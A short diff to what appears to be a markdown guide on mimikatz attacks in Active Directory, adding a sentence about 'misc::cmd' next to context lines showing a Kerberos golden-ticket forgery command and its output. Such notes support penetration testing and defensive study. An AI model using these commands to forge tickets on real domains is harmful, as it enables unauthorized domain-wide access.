@@ -325,6 +325,8 @@ mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-160287
 
 Get the shell:
 
+`misc::cmd`will open a new command prompt with elevated privileges to all machines.
+
 ```
 mimikatz # misc::cmd
 Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
